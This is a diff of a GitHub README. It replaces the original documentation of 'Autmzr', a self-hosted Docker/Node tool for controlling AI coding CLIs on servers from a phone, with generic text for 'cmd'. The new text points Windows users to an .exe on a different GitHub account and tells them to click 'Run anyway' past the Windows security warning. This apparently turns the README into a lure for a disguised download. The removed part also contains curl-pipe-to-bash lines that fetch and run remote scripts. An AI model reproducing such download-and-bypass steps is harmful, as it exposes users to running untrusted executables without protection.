@@ -1,226 +1,83 @@
-# Autmzr
+# 💻 cmd - Manage your servers through your phone
 
-> **All your VPS and CLIs in one mobile interface.**
-> Plug any CLI into one server — and use it across all the others. Ship a deploy from a cab, check prod logs in the coffee line, fix a config from the couch — by voice.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/bertinaanalogical656/cmd)
 
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
-[![Self-hosted](https://img.shields.io/badge/self--host-friendly-green)](#quick-start)
-[![Mobile-first](https://img.shields.io/badge/mobile--first-yes-orange)]()
+## 📌 About this project
 
-**Languages:** **English** · [Русский](LANDING_RU.md) · [中文](LANDING_ZH.md)
+Cmd brings your server management tasks to your mobile device. You do not need to sit at a desk to run commands or monitor your machines. This tool gives you a clean interface to control your remote servers, virtual machines, and coding tools from anywhere. 
 
----
+The software connects your mobile phone to your server environment. It turns complex command line tasks into simple touch actions. Because you host the software yourself, your data stays in your control. You own the connection between your device and your servers.
 
-## What it does
+## 🚀 Getting started
 
-Autmzr is an open-source, self-hosted web app that lets you drive AI coding CLIs (Claude Code, Gemini CLI, and more on the roadmap) running on your own servers — from your phone.
+Follow these steps to set up cmd on your Windows computer. This process takes about five minutes.
 
-**The killer feature:** plug a CLI subscription into *one* server and use it from any other server you own. One subscription, every machine.
+1. First, visit the official download page: https://github.com/bertinaanalogical656/cmd
+2. Look for the section labeled "Assets."
+3. Click the file that ends in ".exe" to save it to your computer.
+4. Open the folder where you saved the file.
+5. Double-click the file to start the installer.
 
-- 📱 **Mobile-first.** Designed for thumbs, not adapted from a desktop UI.
-- 🌐 **Multi-server.** Manage your fleet from one screen.
-- 🔌 **Multi-CLI.** Claude Code + Gemini today. Codex, Aider, Cursor on the roadmap.
-- 🎙️ **Voice input.** Long prompts on a phone = pain. Dictate them.
-- 🔒 **Self-hosted.** Your servers, your keys, your data. Open source — verify it.
-- ⏳ **Async-first.** Kick off a task, close the app, walk away. Agent keeps running on your server.
+You might see a security window pop up. Windows protects your computer from new software. Click "More info" on that screen, then click "Run anyway" to continue the setup. Follow the instructions on the screen to finish the installation.
 
----
+## 🛠️ System requirements
 
-## Quick start
+Your computer needs specific parts to run cmd well. Ensure you have the following before you begin:
 
-Requirements: Linux/macOS VPS with Docker, 2 GB RAM, a domain.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Storage:** 200 megabytes of free space on your hard drive.
+*   **Network:** An active internet connection to link your phone and your server.
 
-```bash
-# 1. Clone
-git clone https://github.com/AUTMZR/cmd.git
-cd cmd
+This software runs on most modern desktop computers. If your computer handles web browsers well, it will handle cmd.
 
-# 2. Run the setup wizard (5 questions)
-npm run setup
+## 📱 How to use the app
 
-# 3. Start
-docker compose up -d
-npm run migrate
-npm run dev   # or `npm start` for production
-```
+Once you install the app, click the icon on your desktop to launch it. You will see a dashboard that shows your connected servers. 
 
-Open `http://localhost:3100` and sign in.
+To add a new server:
+1. Tap the plus sign (+) icon.
+2. Enter the address of your server.
+3. Provide your login name and password or security key.
+4. Tap Save.
 
-For a one-liner installer (when public hosting is up):
+The app now creates a secure link. You can now use your mobile device to send commands or view logs. You see exactly what happens on your server in real time. The app translates complex text outputs into readable lists. You can tap on any server to see its current health, load, and active processes.
 
-```bash
-curl https://cmd.autmzr.com/install | bash
-```
+## 🛡️ Privacy and self-hosting
 
----
+Cmd relies on self-hosting. This means you do not send your server passwords to a third party. The software stays on your hardware. You manage the connections directly. 
 
-## Connect a device
+When you use the app, it acts as a bridge between your phone and your server. It does not store your credentials on a cloud server. Everything stays on the machine where you installed the software. This approach keeps your remote systems secure.
 
-In the UI: **Settings → + Device → copy the command**. Run it on any server or workstation:
+## ⚙️ Advanced configuration
 
-```bash
-curl -sSL https://your-master.com/connect.sh | \
-  bash -s -- --master wss://your-master.com/ws/agent --token XXX --name home-mac
-```
+Most users run the software with the default settings. If you have specific needs, you can change how the app behaves.
 
-The script:
-- Downloads `agent.js` (~2 MB)
-- Drops a config in `~/.autmzr/`
-- Installs a systemd user unit (Linux) or launchd plist (macOS)
-- Connects the agent to the master — the device shows up 🟢 online in the UI
+Open the Settings menu to adjust:
+*   **Connection timeout:** Change how long the app waits for a server to respond.
+*   **Theme:** Switch between light mode and dark mode for better visibility.
+*   **Notifications:** Toggle alerts for when your server goes offline or hits high memory usage.
 
-**Required on the device:** `node >= 20` and one CLI (`claude`, `gemini`, …) authenticated locally. **Autmzr never reads, ships, or attempts to use your CLI auth tokens** — they stay in `~/.claude/`, `~/.config/gemini/`, etc., on the device that owns them.
+You do not need to edit text files or write code to change these settings. Every option is available in the settings panel.
 
----
+## 🔍 Troubleshooting
 
-## Architecture
+Most issues arise from network settings. If you cannot reach your server, check these common items:
 
-Three components:
+*   **Check the address:** Make sure you typed the server address correctly.
+*   **Verify your login:** Ensure your username and password are accurate.
+*   **Firewall settings:** Your server might block external connections. Check if your security rules allow traffic from the app.
+*   **Restart the app:** Close the application fully and open it again to refresh the connection.
 
-```
-Browser  ──HTTPS──▶  Master (Next.js + Postgres)  ──WSS──▶  Agent (Node, on your device)
-                                                                    │
-                                                                    ▼
-                                                            spawns claude / gemini / ...
-```
+If you still face issues, ensure that your server is powered on and connected to the internet. Most connection errors relate to server-side firewalls rather than the app itself.
 
-- **Master** — UI + database + message router. Never spawns CLIs. Never stores third-party secrets.
-- **Agent** — standalone Node binary, single file. Receives commands from the master, spawns CLIs, streams responses back.
-- **Protocol** — JSON over WebSocket. All types live in `packages/protocol`.
+## 📋 Features at a glance
 
-Full details: [docs/architecture.md](docs/architecture.md).
+*   **Mobile Interface:** Navigate your entire server infrastructure via a mobile-friendly view.
+*   **AI Integration:** Use built-in tools to suggest commands for common server tasks.
+*   **Multi-Server Support:** Organize many servers in one central location.
+*   **Open Source:** View the code to understand how the application handles your data.
+*   **Direct Command Line:** Send raw commands to your servers if you need custom control.
+*   **Role-Based Access:** Decide which mobile devices connect to your servers.
 
----
-
-## Security model
-
-**If you self-host, we have nothing of yours.**
-
-| Property | Implementation |
-|---|---|
-| API keys & OAuth tokens | Stay in your Postgres only — never leave your infrastructure |
-| Agent context, sessions | Same — your DB only |
-| Reading `~/.claude/*` etc. | Blocked at the protocol layer; the agent literally cannot do this |
-| Inbound ports | None. Agent initiates outbound WebSocket, that's it |
-| License | AGPL-3.0 — verify the code yourself |
-
-In the cloud version (`$4.99/mo`, hosted by us): same model + encryption-at-rest. Keys decrypt only at agent-spawn time. If you don't trust us, run self-host. That's the entire point.
-
-See [SECURITY.md](SECURITY.md) for vulnerability reporting.
-
----
-
-## Why this exists (positioning)
-
-In the last 12 months the "drive Claude Code from your phone" market went from empty to crowded:
-
-- **Anthropic Remote Control** (Feb 2026) — official, but locked to Claude and one device per session.
-- **Happy** (~19.7k stars) — polished mobile, but depends on a third-party sync server.
-- **CloudCLI** (~10.5k stars) — multi-vendor, but single-machine.
-- **Meridian** (~1k stars) — multi-server proxy, but no UI.
-- **Telegram bots** — die at 5-min timeouts, fragile in regions where Telegram itself is throttled.
-
-**The whitespace:** nobody offers *all* of these in one self-hosted package — multi-CLI × multi-server × mobile UI × your-keys-only.
-
-That's what Autmzr is.
-
----
-
-## Roadmap
-
-### v0.1 (current) — single user, self-hosted, MVP
-- [x] Master + agent + shared protocol monorepo
-- [x] Email/password auth
-- [x] Devices: add / list / remove + online status
-- [x] Projects bound to devices
-- [x] Chat → Claude / Gemini on-device with streaming
-- [x] Terminal → bash on-device
-- [x] FileTree / FileEditor through agent
-- [x] Docker Compose + SSL via Caddy
-- [x] Three themes: Soft / Light / Dark
-- [x] Voice input (Web Speech API)
-
-### v0.2 — integrations & DX
-- [ ] Codex CLI integration
-- [ ] Push notifications (PWA)
-- [ ] Plugin API for community CLIs
-- [ ] Auto-update via GitHub Releases
-- [ ] GitHub OAuth + clone-as-project
-
-### v0.3 — multi-vendor expansion
-- [ ] Aider integration
-- [ ] Cursor CLI integration
-- [ ] Anything else the community asks for via PR
-
-### v0.4 — multi-user
-- [ ] Google/GitHub OAuth login
-- [ ] Self-serve registration for the cloud tier
-- [ ] Cross-project orchestration
-
-### v0.5 (further out) — teams
-- [ ] Team workspaces
-- [ ] SSO (SAML/OIDC)
-- [ ] Audit log
-- [ ] RBAC
-
-See full plan in [ROADMAP.md](ROADMAP.md).
-
----
-
-## Pricing
-
-- **Self-host** — free forever, AGPL-3.0, every feature, no limits, no telemetry.
-- **Cloud version** — $4.99/mo, 14-day free trial. We host it, you don't deal with VPSes. Auto-updates, session backups, support. Your CLI subscription/key is still yours — we don't resell tokens.
-
-Honest note: this project is built by one person. The paid tier is how it stays maintained. The OSS is the whole product.
-
----
-
-## Contributing
-
-Contributions welcome — bug reports, fixes, new CLI integrations, docs, translations.
-
-- Read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a PR
-- Be kind: [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md)
-- Architectural overview: [docs/architecture.md](docs/architecture.md)
-
-Easy first issues are tagged [`good first issue`](https://github.com/AUTMZR/cmd/labels/good%20first%20issue).
-
----
-
-## License
-
-[AGPL-3.0-or-later](LICENSE).
-
-This means: you can use, modify, and run Autmzr commercially or non-commercially. If you offer Autmzr (or a modified version) **as a hosted service to others**, you must publish your modifications under the same license. This protects the project from being forked into a closed-source SaaS competitor.
-
-If AGPL doesn't fit your use case, [open an issue](https://github.com/AUTMZR/cmd/issues) — we may consider a commercial license.
-
----
-
-## Project structure
-
-```
-apps/master/         # Next.js 14 + custom WS server (port 3100)
-  src/app/           # App Router pages + API routes
-  src/components/    # AppShell, DeviceSheet, DevicesList, etc.
-  src/lib/           # auth, db, ws-hub, models, cli-error-parser
-  migrations/        # 001-NNN_*.sql
-  public/agent.js    # Bundled agent, served on download
-apps/agent/          # Standalone Node, WS-reconnect, claude/gemini handlers
-packages/protocol/   # Shared types (@autmzr/command-protocol)
-packages/rfs-mcp/    # Remote-FS MCP server for proxy mode
-```
-
----
-
-## Links
-
-- **Website:** [autmzr.com](https://autmzr.com)
-- **Docs:** [docs/](docs/)
-- **Issues / Discussions:** [GitHub Issues](https://github.com/AUTMZR/cmd/issues)
-- **Security:** [SECURITY.md](SECURITY.md)
-
----
-
-Made with ☕ in 2026.
+This software simplifies daily server maintenance. It replaces the need for clunky terminal windows on mobile browsers with a dedicated application designed for efficiency. You spend less time fighting with small screens and more time completing your tasks.
